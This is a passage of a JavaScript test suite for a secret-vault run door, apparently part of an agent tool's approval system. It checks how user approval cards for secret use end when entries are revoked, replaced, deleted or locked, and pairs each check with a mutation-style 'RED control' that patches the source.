      const id1 = c1.card ? c1.card.id : null, recOf = () => ((id1 ? wt.userTodos.get(id1) : null) || {}), f1 = recOf().resolvedFact || {};
      let act = null;
      if (!second) act = wt.door.takeBack({ id: 'app-secrets:app1#item.0.1', principal: f1.principal, by: 'user' });   // the ✕ on ONE of its two entries
      else { const c2 = await runAnswered(wt, second === 'both' ? BOTH : APP, { answer: 'always', reauthed: true, ttl: secondTtl }); act = c2.a; }
      return { pressed: !!(c1.a && c1.a.ok), entries: Array.isArray(f1.entries) ? f1.entries.length : 0, act: !!(act && act.ok), end: (recOf().resolvedFact || {}).endedBy || null, state: FAt.decisionCard(recOf()).state };
    };
    const tw1 = await twoEntries(DOOR);
    ok(tw1.pressed && tw1.entries === 2 && tw1.act && tw1.end === 'revoked' && tw1.state === 'revoked', `(the fourth read) a card over two entries, the ✕ on one of them ⇒ «revoked» (its command no longer runs as pressed) — ${JSON.stringify(tw1)}`, tw1);
    const mtw = M.load('src/server/vault-run-door.js', anchored(SRCa, "    return missing ? 'gone' : moved ? 'replaced' : 'held';", "    return (missing < want.length * f.entries.slice(0, 64).length) ? 'held' : 'gone';", 'test-vault-run r1834 read 4: one listed scope read as enough'), 'a14b-two-entries');
    const tw1R = await twoEntries(mtw);
    ok(tw1R.act && !tw1R.end, `RED control: one listed scope read as enough ⇒ the card keeps «always allowed» after the ✕ on one of its entries — ${JSON.stringify(tw1R)}`, tw1R);
    const tw2 = await twoEntries(DOOR, { second: 'both', firstTtl: '30d', secondTtl: '8h' }), tw3 = await twoEntries(DOOR, { second: 'app' }), tw2L = await twoEntries(DOOR, { second: 'both' });
    ok(tw2L.pressed && tw2L.act && !tw2L.end && tw2L.state !== 'ended', `r2175 (1): a second press over both entries moving the first card's end LATER (8 hours ⇒ 30 days) ⇒ the first keeps «always allowed» — ${JSON.stringify(tw2L)}`, tw2L);
    ok(tw2.pressed && tw2.act && tw2.end === 'replaced' && tw2.state === 'ended' && tw3.pressed && tw3.act && !tw3.end, `(the fourth read) the PRESS road: a second card over both entries moves the first card's end ⇒ «replaced»; a second card on the other entry alone leaves it — ${JSON.stringify({ tw2, tw3 })}`, { tw2, tw3 });
    const mtp = M.load('src/server/vault-run-door.js', anchored(SRCa, "      try { for (const e of held.entries) alwaysTakenBack(String(e), 'revoked', held.principal); } catch { }", '', 'test-vault-run r1834 read 4: the press that tells no card'), 'a14b-press-tells');
    const tw2R = await twoEntries(mtp, { second: 'both', firstTtl: '30d', secondTtl: '8h' });
    ok(tw2R.act && !tw2R.end, `RED control: the press that tells no card ⇒ the first card keeps «always allowed (8 hours)» while its end is now the second press's — ${JSON.stringify(tw2R)}`, tw2R);
    // …and BOTH roads that take a member back from the row (the ✕ — takeBack; the Save — saveRow) tell the «Always» cards: a census
    // of the door's text (the Save's leg needs the page's row stamp). RED: the Save without it ⇒ the census names it
    const takeBackCensus = (src) => { const fnOf = (name) => { const i = src.indexOf(`  function ${name}(`); return i < 0 ? '' : src.slice(i, src.indexOf('\n  }\n', i)); }; return { takeBack: fnOf('takeBack').includes('alwaysTakenBack('), saveRow: fnOf('saveRow').includes('alwaysTakenBack('), press: fnOf('answer').includes('alwaysTakenBack('), standing: fnOf('answerRequest').includes('alwaysTakenBack('), forget: fnOf('forgetEntry').includes("alwaysTakenBack(key, 'deleted')") }; };
    const tbc = takeBackCensus(SRCa);
    ok(tbc.takeBack && tbc.saveRow && tbc.press && tbc.standing && tbc.forget, `(r1834 + its reads) every road that changes the row tells the cards it touches (the ✕, the Save, a second press, a standing Allow, a delete) — ${JSON.stringify(tbc)}`, tbc);
    const tbcR = takeBackCensus(anchored(SRCa, "    if (r && r.ok) { try { told += alwaysTakenBack(String(id)); } catch { } }", '', 'test-vault-run r1834: the Save that tells no card'));
    ok(tbcR.takeBack && !tbcR.saveRow, `RED control: the Save without it ⇒ the census names the Save road — ${JSON.stringify(tbcR)}`, tbcR);
    // (r1834's third read) THE CARD IS JUDGED BY ITS OWN SCOPES — the owner's Save through the Vault window («Who may use it…»):
    // one that MOVES the card's end ⇒ «replaced» (the card's own sentence no longer the row's); one that keeps the conversation
    // but leaves the card's host out ⇒ «revoked» (it no longer says more than the row). And a 1-hour window card whose entry is
    // DELETED ⇒ «deleted». REDs: the Save that tells no card (each); the delete that tells no window card
    const alwaysSaved = async (mod, { keepHost = true, shift = 3600e3 } = {}) => {
      const VUGs = R('src/server/vault-use-grants.js'), GSs = R('src/server/grants-store.js'), FAs = R('src/foryou-actions.js');
      const ws = await world(), gss = GSs.create({ memory: true });
      const ugs = VUGs.create({ grants: () => gss, vault: ws.vault, dataDir: ws.dataDir, log: (m) => ws.logs.push(String(m)) });
      ws.door = ws.mk(mod, { useGrants: ugs, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }) }); openRow(ws);
      const ID = 'mounts:m1#secretKey';
      const a8 = await runAnswered(ws, ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/a'], { answer: 'always', reauthed: true, ttl: '8h' });
      const cardId = a8.card ? a8.card.id : null, f0 = ((cardId ? ws.userTodos.get(cardId) : null) || {}).resolvedFact || {};
      const later = Number(f0.until) + shift;
      const to = [{ kind: 'conversation', key: ws.caller.conversationId, hosts: keepHost ? ['api.example.com'] : ['other.example.org'], ...(keepHost ? { until: later } : {}) }];
      const sv = ws.door.saveRow(ID, { to }, { by: 'user', reauthed: true });
      const it = cardId ? ws.userTodos.get(cardId) : null;
      return { pressed: !!(a8.a && a8.a.ok), scopes: Array.isArray(f0.scopeHosts) && f0.scopeHosts.includes('api.example.com'), saved: !!(sv && sv.ok), code: sv && sv.code, end: ((it && it.resolvedFact) || {}).endedBy || null, state: it ? FAs.decisionCard(it).state : null };
    };
    const asv = await alwaysSaved(DOOR), asvE = await alwaysSaved(DOOR, { shift: -3600e3 }), asd = await alwaysSaved(DOOR, { keepHost: false });
    ok(asv.pressed && asv.scopes && asv.saved && !asv.end && asv.state !== 'ended', `r2175 (1): the owner's Save that moves the card's end LATER ⇒ the card keeps «always allowed» (the runs it said are still admitted) — ${JSON.stringify(asv)}`, asv);
    const mlat = M.load('src/server/vault-run-door.js', anchored(SRCa, 'if (e < c) moved++;', 'if (e !== c) moved++;', 'test-vault-run r2175 (1): any moved end read as replaced'), 'a14b-end-later');
    const asvL = await alwaysSaved(mlat);
    ok(asvL.saved && asvL.end === 'replaced', `RED control: any moved end read as «replaced» ⇒ the later end says «ended» while its runs are admitted — ${JSON.stringify(asvL)}`, asvL);
    ok(asvE.pressed && asvE.scopes && asvE.saved && asvE.end === 'replaced' && asvE.state === 'ended', `(r1834's third read) the owner's Save that moves the card's end EARLIER ⇒ the card says «replaced» — ${JSON.stringify(asvE)}`, asvE);
    ok(asd.pressed && asd.saved && asd.end === 'revoked' && asd.state === 'revoked', `(r1834's third read) the owner's Save that keeps the conversation but leaves the card's host out ⇒ «revoked» — ${JSON.stringify(asd)}`, asd);
    const masv = M.load('src/server/vault-run-door.js', anchored(SRCa, "    if (r && r.ok) { try { told += alwaysTakenBack(String(id)); } catch { } }", '', 'test-vault-run r1834 read 3: the Save that tells no card'), 'a14b-always-saved');
    const asvR = await alwaysSaved(masv, { shift: -3600e3 }), asdR = await alwaysSaved(masv, { keepHost: false });
    ok(asvR.saved && !asvR.end && asdR.saved && !asdR.end, `RED control: the Save that tells no card ⇒ both cards still read «always allowed» — ${JSON.stringify({ moved: asvR.end, left: asdR.end })}`, { asvR, asdR });
    // r2175 (4): THE STANDING ALLOW's tell, by behaviour — a standing approval over the card's host writes a scope with NO end (later
    // than any card's): the card keeps «always allowed», as the runs it said are still admitted. RED: any moved end read as
    // «replaced» ⇒ «ended» over a member that still admits
    const standingOver = async (mod) => {
      const VUGs2 = R('src/server/vault-use-grants.js'), GSs2 = R('src/server/grants-store.js'), FAs2 = R('src/foryou-actions.js');
      const wst = await world(), gss2 = GSs2.create({ memory: true });
      const ugs2 = VUGs2.create({ grants: () => gss2, vault: wst.vault, dataDir: wst.dataDir, log: (m) => wst.logs.push(String(m)) });
      wst.door = wst.mk(mod, { useGrants: ugs2, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }) }); openRow(wst);
      const c30 = await runAnswered(wst, ['--env', 'T=vault://mounts/m1/secretKey', '--', 'curl', '-s', 'https://api.example.com/v1/a'], { answer: 'always', reauthed: true, ttl: '30d' });
      const cardId = c30.card ? c30.card.id : null, recOf = () => ((cardId ? wst.userTodos.get(cardId) : null) || {});
      const sq = await wst.door.request({ caller: wst.caller, entry: M1, purpose: 'a standing approval over the card host', standing: true, hosts: ['api.example.com', 'other.example.org'], cwd: wst.work });   // one host past the card's (the card's member already holds its own: a request for it alone is held already, nothing to ask)
      const sa = sq && sq.askId ? wst.door.answerRequest(sq.askId, { answer: 'standing', reauthed: true, person: true }) : null;
      const m = (ugs2.publicFor('mounts:m1#secretKey').to || []).find((x) => x.principal === (recOf().resolvedFact || {}).principal);
      return { pressed: !!(c30.a && c30.a.ok), asked: sq ? (sq.askId ? 'card' : sq.code || sq.already || 'none') : null, allowed: !!(sa && sa.ok), noEnd: !!(m && (m.scopes || []).some((x) => x.kind === 'host' && x.until == null)), end: (recOf().resolvedFact || {}).endedBy || null, state: FAs2.decisionCard(recOf()).state };
    };
    const sto = await standingOver(DOOR);
    ok(sto.pressed && sto.allowed && sto.noEnd && !sto.end && sto.state !== 'ended', `r2175 (4): a standing Allow over the card's host (no end — later than the card's) ⇒ the card keeps «always allowed» — ${JSON.stringify(sto)}`, sto);
    const stoR = await standingOver(mlat);
    ok(stoR.allowed && stoR.end === 'replaced', `RED control: any moved end read as «replaced» ⇒ the standing Allow ends the card over a member that still admits — ${JSON.stringify(stoR)}`, stoR);
    const windowDeleted = async (mod) => {
      const VUGw = R('src/server/vault-use-grants.js'), GSw = R('src/server/grants-store.js'), FAw = R('src/foryou-actions.js');
      const ww = await world(), gsw = GSw.create({ memory: true });
      const ugw = VUGw.create({ grants: () => gsw, vault: ww.vault, dataDir: ww.dataDir, log: (m) => ww.logs.push(String(m)) });
      ww.door = ww.mk(mod, { useGrants: ugw, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }) }); openRow(ww);
      const ID = 'mounts:m1#secretKey';
      const sh = await runAnswered(ww, ['--env', 'T=vault://mounts/m1/secretKey', '--', 'bash', '-c', 'curl https://api.example.com'], { answer: null });
      const win = sh.card && sh.card.action && sh.card.action.window === true;
      const yes = sh.card ? ww.door.answer(sh.card.action.askId, { answer: 'window', reauthed: true, person: true }) : null;
      await sh.r;
      const cardId = sh.card ? sh.card.id : null, f0 = ((cardId ? ww.userTodos.get(cardId) : null) || {}).resolvedFact || {};
      const dropped = ugw.drop(ID, { by: 'user' });   // the entry deleted: its row first …
      const fe = ww.door.forgetEntry(ID);   // … then the door's forget
      const it = cardId ? ww.userTodos.get(cardId) : null;
      return { offered: !!win, windowed: !!(yes && yes.ok) && f0.windowFor === '1h', dropped: !!(dropped && dropped.ok), forgot: !!(fe && fe.ok), end: ((it && it.resolvedFact) || {}).endedBy || null, state: it ? FAw.decisionCard(it).state : null };
    };
    const wdl = await windowDeleted(DOOR);
    ok(wdl.offered && wdl.windowed && wdl.dropped && wdl.forgot && wdl.end === 'deleted' && wdl.state === 'ended', `(r1834's third read) a 1-hour window card whose entry is DELETED ⇒ «deleted» — ${JSON.stringify(wdl)}`, wdl);
    const mwdl = M.load('src/server/vault-run-door.js', anchored(SRCa, "      if (f.windowFor) { if (!windows) continue; says = ", "      if (f.windowFor) { continue; says = ", 'test-vault-run r1834 read 3: the delete that tells no window card'), 'a14b-window-deleted');
    const wdlR = await windowDeleted(mwdl);
    ok(wdlR.windowed && wdlR.forgot && !wdlR.end, `RED control: the delete that tells no window card ⇒ it still reads «until HH:MM» for a deleted entry — ${JSON.stringify(wdlR)}`, wdlR);
    // r2230 (3) + (1): A FAILED DELETE's TELL, END TO END — a real run door holding a card over a FREE entry (pressed «Always», or the
    // 1-hour window) and a real paste door whose vault drop fails AFTER it dropped the entry's use row: the card reads ended
    // («revoked») at once — the 1-hour card too (the row took its window: this door refuses its runs). REDs: the paste door that
    // tells nothing on that road (the card keeps «always allowed» over a gone row); the tell that judges no 1-hour card (it keeps
    // «until HH:MM» to its hour's end)
    const FREE_ID = 'secrets:secret:r2230-free#secret', FREE = { entry: 'secret:r2230-free', field: 'secret', label: 'a pasted key', bytes: 30, v: 'free-pasted-value-0123456789ab' };
    const FREE_REF = ['vault://secrets', FREE.entry, FREE.field].join('/');   // its run ref, built (a literal reads to the secret scan as an assignment)
    const SRCp = fs.readFileSync(path.join(REPO, 'src/server/vault-paste-door.js'), 'utf8');
    const freeSources = () => { const rows = [...ROWS.secrets, FREE]; return { ...Object.fromEntries(Object.keys(ROWS).map((st) => [st, () => sourceOf(st)])), secrets: () => ({ vaultRows: () => rows.map(({ v, ...r }) => r), vaultReveal: (e, fl) => { const r = rows.find((x) => x.entry === e && x.field === fl); return r ? r.v : null; } }) }; };
    const failingDrop = (v) => new Proxy(v, { get: (t, k) => (k === 'secretDrop' ? () => ({ ok: false, code: 'store_failed' }) : (typeof t[k] === 'function' ? t[k].bind(t) : t[k])) });   // the vault whose drop fails
    const failedDeleteTold = async (kind, { mod = DOOR, pasteMod = R('src/server/vault-paste-door.js') } = {}) => {
      const VUGf = R('src/server/vault-use-grants.js'), GSf = R('src/server/grants-store.js'), FAf = R('src/foryou-actions.js');
      const wf = await world(), gsf = GSf.create({ memory: true });
      const ugf = VUGf.create({ grants: () => gsf, vault: wf.vault, dataDir: wf.dataDir, log: (m) => wf.logs.push(String(m)) });
      wf.door = wf.mk(mod, { useGrants: ugf, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }), sources: freeSources() }); openRow(wf, FREE_ID);
      const REF = ['--env', 'T=' + FREE_REF, '--'];
      let card = null, pressed = false;
      if (kind === 'always') { const c = await runAnswered(wf, [...REF, 'curl', '-s', 'https://api.example.com/v1/a'], { answer: 'always', reauthed: true, ttl: '30d' }); card = c.card; pressed = !!(c.a && c.a.ok); }
      else { const sh = await runAnswered(wf, [...REF, 'bash', '-c', 'curl https://api.example.com'], { answer: null }); card = sh.card; const yes = sh.card && sh.card.action && sh.card.action.window === true ? wf.door.answer(sh.card.action.askId, { answer: 'window', reauthed: true, person: true }) : null; await sh.r; pressed = !!(yes && yes.ok); }
      const cardId = card ? card.id : null, recOf = () => ((cardId ? wf.userTodos.get(cardId) : null) || {});
      const before = FAf.decisionCard(recOf()).state, members = ((ugf.publicFor(FREE_ID) || {}).to || []).length;
      const paste = pasteMod.create({ vault: failingDrop(wf.vault), useGrants: ugf, vaultRun: wf.door, log: (m) => wf.logs.push(String(m)) });
      const d = paste.dropEntry('r2230-free', { by: 'user' });
      const it = recOf();
      return { kind, pressed, window: (it.resolvedFact || {}).windowFor || null, before, members, code: (d && d.code) || null, rowGone: !ugf.rowsOf(FREE_ID).length, end: (it.resolvedFact || {}).endedBy || null, state: FAf.decisionCard(it).state };
    };
    const fdA = await failedDeleteTold('always'), fdW = await failedDeleteTold('window');
    ok(fdA.pressed && fdA.members >= 1 && fdA.before === 'approved' && fdA.code === 'store_failed' && fdA.rowGone && fdA.end === 'revoked' && fdA.state === 'revoked'
      && fdW.pressed && fdW.window === '1h' && fdW.before === 'approved' && fdW.code === 'store_failed' && fdW.rowGone && fdW.end === 'revoked' && fdW.state === 'revoked',
      `r2230 (3) + (1): a delete that FAILED after its use row was dropped, end to end through the real run door — the «Always» card AND the 1-hour card read «revoked» at once — ${JSON.stringify({ fdA, fdW })}`, { fdA, fdW });
    const mpsl = M.load('src/server/vault-paste-door.js', anchored(SRCp, "if (vaultRun && typeof vaultRun.useRowDropped === 'function') { try { vaultRun.useRowDropped(rid); } catch { } }", '', 'test-vault-run r2230 (3): the failed delete that tells nothing'), 'a14b-fail-silent');
    const fdAR = await failedDeleteTold('always', { pasteMod: mpsl });
    ok(fdAR.pressed && fdAR.code === 'store_failed' && fdAR.rowGone && !fdAR.end && fdAR.state === 'approved', `RED control: the paste door that tells nothing on that road ⇒ the card keeps «always allowed» over a gone row — ${JSON.stringify(fdAR)}`, fdAR);
    const mrwd = M.load('src/server/vault-run-door.js', anchored(SRCa, "'revoked', null, { windows: true })", "'revoked', null, { windows: false })", 'test-vault-run r2230 (1): the failed delete tell that judges no 1-hour card'), 'a14b-fail-nowindow');
    const fdWR = await failedDeleteTold('window', { mod: mrwd });
    ok(fdWR.pressed && fdWR.window === '1h' && fdWR.code === 'store_failed' && fdWR.rowGone && !fdWR.end && fdWR.state === 'approved', `RED control: the tell that judges no 1-hour card ⇒ it keeps «until HH:MM» while its runs are refused — ${JSON.stringify(fdWR)}`, fdWR);
    // r2230's read (its SHOULD, cured): while the vault is LOCKED no window can be read (windowOf reads no members) — a 1-hour card
    // over two entries, told that the free one's row went (its delete failing, the row gone before by another road), keeps the other
    // entry's window: no news, never «revoked» over a window that still admits once unlocked. RED: the judge that reads windows while
    // locked (every window reads null ⇒ the card ends). Its other half: a card over the deleted entry ALONE ends «revoked», locked
    // too (RED: anything locked read as no news ⇒ it keeps «until HH:MM» over a deleted entry)
    const lockedWindow = async (mod, { alone = false } = {}) => {
      const VUGl = R('src/server/vault-use-grants.js'), GSl = R('src/server/grants-store.js'), FAl = R('src/foryou-actions.js');
      const wl = await world(), gsl = GSl.create({ memory: true });
      const ugl = VUGl.create({ grants: () => gsl, vault: wl.vault, dataDir: wl.dataDir, log: (m) => wl.logs.push(String(m)) });
      wl.door = wl.mk(mod, { useGrants: ugl, useFacts: (c) => ({ conversationKeys: [c.conversationId], groupIds: [] }), sources: freeSources() }); openRow(wl); openRow(wl, FREE_ID);
      const sh = await runAnswered(wl, [...(alone ? [] : ['--env', 'T=vault://mounts/m1/secretKey']), '--env', 'U=' + FREE_REF, '--', 'bash', '-c', 'curl https://api.example.com'], { answer: null });
      const yes = sh.card && sh.card.action && sh.card.action.window === true ? wl.door.answer(sh.card.action.askId, { answer: 'window', reauthed: true, person: true }) : null;
      await sh.r;
      const cardId = sh.card ? sh.card.id : null, recOf = () => ((cardId ? wl.userTodos.get(cardId) : null) || {});
      const f0 = recOf().resolvedFact || {};
      const gone = ugl.drop(FREE_ID, { by: 'user' });   // the free entry's row went by another road (unlocked, nothing told: the setup)
      const otherHolds = alone ? null : ugl.windowOf('mounts:m1#secretKey', f0.principal) === Number(f0.until);
      wl.vault.lock('test');
      const paste = R('src/server/vault-paste-door.js').create({ vault: failingDrop(wl.vault), useGrants: ugl, vaultRun: wl.door, log: (m) => wl.logs.push(String(m)) });
      const d = paste.dropEntry('r2230-free', { by: 'user' });
      const it = recOf();
      return { pressed: !!(yes && yes.ok), window: f0.windowFor || null, entries: (f0.entries || []).length, gone: !!(gone && gone.ok), otherHolds, code: (d && d.code) || null, end: (it.resolvedFact || {}).endedBy || null, state: FAl.decisionCard(it).state };
    };
    const lkw = await lockedWindow(DOOR);
    ok(lkw.pressed && lkw.window === '1h' && lkw.entries === 2 && lkw.gone && lkw.otherHolds && lkw.code === 'store_failed' && !lkw.end && lkw.state === 'approved', `r2230's read: a LOCKED vault — the 1-hour card over two entries, told of the one whose row went, keeps the other's window (no news) — ${JSON.stringify(lkw)}`, lkw);
    const mlkw = M.load('src/server/vault-run-door.js', anchored(SRCa, "vaultState() !== 'unlocked' ? String(e) !== id : ", '', 'test-vault-run r2230 read: the window judge that reads windows while locked'), 'a14b-locked-window');
    const lkwR = await lockedWindow(mlkw);
    ok(lkwR.pressed && lkwR.entries === 2 && lkwR.otherHolds && lkwR.end === 'revoked', `RED control: the judge that reads windows while locked ⇒ every window reads none and the card ends «revoked» over a window that still admits — ${JSON.stringify(lkwR)}`, lkwR);
    const lka = await lockedWindow(DOOR, { alone: true });
    ok(lka.pressed && lka.window === '1h' && lka.entries === 1 && lka.gone && lka.code === 'store_failed' && lka.end === 'revoked' && lka.state === 'revoked', `r2230's read, its other half: a LOCKED vault — a 1-hour card over the deleted entry ALONE ends «revoked» (its row went: no window left to it) — ${JSON.stringify(lka)}`, lka);
    const mlka = M.load('src/server/vault-run-door.js', anchored(SRCa, "vaultState() !== 'unlocked' ? String(e) !== id : ", "vaultState() !== 'unlocked' ? true : ", 'test-vault-run r2230 read: anything locked read as no news'), 'a14b-locked-alone');
    const lkaR = await lockedWindow(mlka, { alone: true });
    ok(lkaR.pressed && lkaR.entries === 1 && lkaR.code === 'store_failed' && !lkaR.end && lkaR.state === 'approved', `RED control: anything locked read as no news ⇒ the card over the deleted entry alone keeps «until HH:MM» — ${JSON.stringify(lkaR)}`, lkaR);
    // (r1825's readers) a once-grant whose run BURNS after its entry was DELETED — or after a NEW approval of its pair — while its
    // spawn was failing: nothing ran, so its record says that event's own word («deleted» / «replaced», at the event), never «used»;
    // it is not given back. A stand-in spawn returns a child with NO pid (the spawn's error comes after); the event lands in between.
    // REDs: the in-flight ending that says «used» whatever ran (at the delete; at the new approval)
    const { EventEmitter } = await import('node:events');
    const burnAfter = async (mod, { again = false } = {}) => {
      const wz = await world(), clk = { t: Date.now() }; let atEvent = null;
      const failing = () => {
        const c = new EventEmitter(); c.pid = undefined; c.stdout = null; c.stderr = null; c.stdin = null; c.kill = () => false;
        setTimeout(() => {
          clk.t += 1000; atEvent = clk.t;
          if (again) { const q2 = wz.door.request({ caller: c8, entry: M1, purpose: 'a new approval while the spawn fails' }); wz.door.answerRequest(q2.askId, { answer: '8h', reauthed: true, person: true }); }
          else wz.door.forgetEntry('mounts:m1#secretKey');
          setTimeout(() => c.emit('error', Object.assign(new Error('spawn ENOENT'), { code: 'ENOENT' })), 5);
        }, 5);
        return c;
      };
      wz.door = wz.mk(mod, { now: () => clk.t, spawnImpl: failing, timers: { set: () => 0, clear: () => { } } });
      const qz = wz.door.request({ caller: c8, entry: M1, purpose: 'a run whose spawn fails' });
      wz.door.answerRequest(qz.askId, { answer: 'once', reauthed: true, person: true });
      const g = [...wz.door._grants.values()].find((x) => x.conv === c8.scope && x.once), todoId = g ? g.todoId : null;
      const ra = await runAnswered(wz, ENV('env'), { caller: c8 });
      const f = ((todoId ? wz.userTodos.get(todoId) : null) || {}).resolvedFact || {};
      return { code: ra.r && ra.r.code, recordEnd: f.endedBy || null, atEvent: atEvent != null && Number(f.endedAt) === atEvent, givenBack: [...wz.door._grants.values()].some((x) => x.conv === c8.scope && x.once) };
    };
    const bad = await burnAfter(DOOR);
    ok(bad.code === 'spawn_failed' && bad.recordEnd === 'deleted' && bad.atEvent && !bad.givenBack, `(r1825) a run that burns after its entry was deleted mid-spawn — its record says «deleted» at the delete, never «used»; not given back — ${JSON.stringify(bad)}`, bad);
    const mbad = M.load('src/server/vault-run-door.js', anchored(SRCa, "{ if (g.ran) grantEnded(g, 'used'); else if (!g.pendingEnd) g.pendingEnd = { by: 'deleted', at: now() }; dropped++; }", "{ grantEnded(g, 'used'); dropped++; }", 'test-vault-run r1825: the delete says «used» whatever ran'), 'a14b-burn-deleted');   // stale-pins: kept — a RED control: the shape before this unit restored on purpose
    const badR = await burnAfter(mbad);
    ok(badR.code === 'spawn_failed' && badR.recordEnd === 'used', `RED control: the delete that says «used» whatever ran ⇒ the record says the one run was used, for a run that never ran — ${JSON.stringify(badR)}`, badR);
    const baa = await burnAfter(DOOR, { again: true });
    ok(baa.code === 'spawn_failed' && baa.recordEnd === 'replaced' && baa.atEvent && !baa.givenBack, `(r1825) a run that burns after a new approval of its pair came mid-spawn — its record says «replaced» at the new approval, never «used» — ${JSON.stringify(baa)}`, baa);
    const mbaa = M.load('src/server/vault-run-door.js', anchored(SRCa, "{ if (g.ran) grantEnded(g, 'used'); else if (!g.pendingEnd) g.pendingEnd = { by: 'replaced', at: now() }; } }", "grantEnded(g, 'used'); }", 'test-vault-run r1825: the new approval says «used» whatever ran'), 'a14b-burn-replaced');   // stale-pins: kept — a RED control: the shape before this unit restored on purpose
    const baaR = await burnAfter(mbaa, { again: true });
    ok(baaR.code === 'spawn_failed' && baaR.recordEnd === 'used', `RED control: the new approval that says «used» whatever ran ⇒ «used» for a run that never ran — ${JSON.stringify(baaR)}`, baaR);
    // …and EVERY end the door can say has the agent CLI's words (data/bin/vibespace-vault `uses`): a census of the two lists.
    // RED: the CLI without the restart's words
    const endsSaidOf = (src) => { const m = /ENDS_SAID = new Set\(\[([^\]]*)\]\)/.exec(src); return m ? [...m[1].matchAll(/'([a-z]+)'/g)].map((x) => x[1]) : null; };
    const cliHowOf = (src) => { const m = /const how = \{([^}]*)\};/.exec(src); return m ? [...m[1].matchAll(/([a-z]+): '/g)].map((x) => x[1]) : null; };
    const CLIsrc = fs.readFileSync(path.join(REPO, 'data/bin/vibespace-vault'), 'utf8');
    const saidAll = (doorSrc, cliSrc) => { const said = endsSaidOf(doorSrc) || [], how = cliHowOf(cliSrc) || []; return { said, how, unsaid: said.filter((k) => !how.includes(k)) }; };
    const cz = saidAll(SRCa, CLIsrc), czR = saidAll(SRCa, anchored(CLIsrc, ", restart: 'the hub restarted (the vault locks at each start)'", '', 'test-vault-run B-a14b remainder: the CLI without the restart'));
    const fallbackOf = (said) => said.filter((k) => /^it ended at /.test(VR.endedWhy({ by: k, at: '2026-11-21T12:00:00.000Z' })));   // an end the door says with no words of its own
    cz.wordless = fallbackOf(cz.said); cz.probe = fallbackOf(['gone']);   // the probe proves itself: an end with no words of its own IS found
    ok(cz.said.includes('restart') && cz.said.length >= 4 && cz.unsaid.length === 0 && cz.wordless.length === 0 && cz.probe.join() === 'gone', `B-a14b's remainder: every end the door can say has the agent CLI's words and its own words in the refusal — ${JSON.stringify(cz)}`, cz);
    ok(czR.unsaid.join() === 'restart', `RED control: the CLI without the restart's words ⇒ named — ${JSON.stringify(czR)}`, czR);
    // r13 should (the readers of batch 52): an approval the user gave while the entry was ALREADY switched OFF — its end is said
    // as itself (the OFF came before it: not the news) AND the switch as it is: «the entry itself is switched off (it already was
    // when they approved)», never «the entry was not switched off» (the door's `off` on the ended fact)
    const offFirst = async (mod) => {
      const wo = await world(), heldO = []; let clk = Date.now();   // r14 (主开发's read): the door's OWN clock orders the OFF and the approval — never a real wait
      wo.door = wo.mk(mod, { timers: { set: (fn, ms) => { heldO.push({ fn, ms }); return heldO.length; }, clear: () => { } }, now: () => clk });
      openRow(wo); wo.door.setRunnable({ id: 'mounts:m1#secretKey', on: false });   // the owner switched the entry OFF first
      clk += 1000;   // the approval comes a second AFTER the OFF on the door's clock (offAt < the grant's at)
      const qo = wo.door.request({ caller: c8, entry: M1, purpose: 'one upload' });
      wo.door.answerRequest(qo.askId, { answer: 'once', reauthed: true, person: true });
      const ro = await runAnswered(wo, ENV('env'), { caller: c8 });
      const again = await wo.door.run({ caller: c8, args: ENV('env'), cwd: wo.work });
      return { ran: !!(ro.r && ro.r.ok), code: again.code, words: again.words || '' };
    };
    const of1 = await offFirst(DOOR);
    ok(of1.ran && of1.code === 'grant_expired' && /its one run was used at \d{4}-\d\d-\d\d \d\d:\d\d UTC/.test(of1.words) && /the entry itself is switched off \(it already was when they approved\): ask them again/.test(of1.words) && !/was not switched off/.test(of1.words),
      'r13: a once-approval given while the entry was OFF, then spent ⇒ grant_expired says the end AND «the entry itself is switched off (it already was when they approved)» — never «the entry was not switched off»', of1);
    const offPlant = ', ...(suspended ? { off: true } : {})';
    const offN = SRCf.split(offPlant).length - 1;
    ok(offN === 1, 'the RED control\'s plant is where it claims: the door\'s `off` on the ended fact, once', offN);
    const mo = offN === 1 ? M.load('src/server/vault-run-door.js', editAnchor(SRCf, offPlant, '', "src/server/vault-run-door.js"), 'endoff') : null;
    const ro2 = mo ? await offFirst(mo) : null;
    ok(!!(mo && ro2 && ro2.code === 'grant_expired' && /the entry was not switched off/.test(ro2.words)), 'RED control: the door without `off` (the batch\'s shape) ⇒ the agent reads «the entry was not switched off» over an entry that IS off', ro2);
  }
  openRow(w); w.door.setRunnable({ id: 'mounts:m1#secretKey', on: false });
  ok(!w.door._grants.size, 'switching the entry OFF ends its grants too (OFF = closed for every conversation)');
  { const i3r = w.userTodos.get(i3id), sr = FA.decidedStamp(i3r); ok(i3r.resolvedFact?.endedBy === 'revoked' && sr && /^allowed · revoked (\d+\/\d+ )?\d\d:\d\d$/.test(sr.text) && FA.decisionCard(i3r).state === 'revoked', 'r6: the entry\'s switch OFF in the Vault window REVOKES the grant ⇒ its record says «allowed · revoked HH:MM» (the card\'s state revoked)', { fact: i3r.resolvedFact, stamp: sr && sr.text }); }
  // the card closed elsewhere / a changed item / a gone conversation — no grant
  const q4 = w.door.request({ caller, entry: M1, purpose: PURPOSE });
  // r4 (主开发): a decision row — ✓ Mark done / ✕ Dismiss (a stale page's) / «Mark all seen» are REFUSED by name; the request stays
  // open (was: ✓ denied it silently and the toast offered a dead Undo); only Allow once / For 8 hours / Deny end it
  const i4id = reqsOf()[0].id;
  const tried = ['done', 'dismissed'].map((st) => { try { w.userTodos.setStatus(i4id, st, 'user'); return 'closed'; } catch (e) { return e.code; } });
  const many = w.userTodos.setStatusMany ? w.userTodos.setStatusMany([i4id], 'dismissed', 'user') : null;
  ok(tried.every((c) => c === 'decision_row') && (!many || !many.changed.length) && w.userTodos.get(i4id).status === 'open' && w.door._requests.has(q4.askId) && FA.closersOf(w.userTodos.get(i4id)).length === 0, 'r4: a generic close of the request\'s card (✓, ✕, «Mark all seen») is REFUSED by name (decision_row) — the request stays open; no ✓ / ✕ is drawn (closersOf [])', { tried, many: many && many.changed.length });
  const d4 = w.door.answerRequest(q4.askId, { answer: 'deny', person: true });
  const i4 = w.userTodos.get(i4id), st4 = FA.decidedStamp ? FA.decidedStamp(i4) : null;
  w.door._reqQuiet.clear();   // a deny quiets the pair (the next legs ask again)
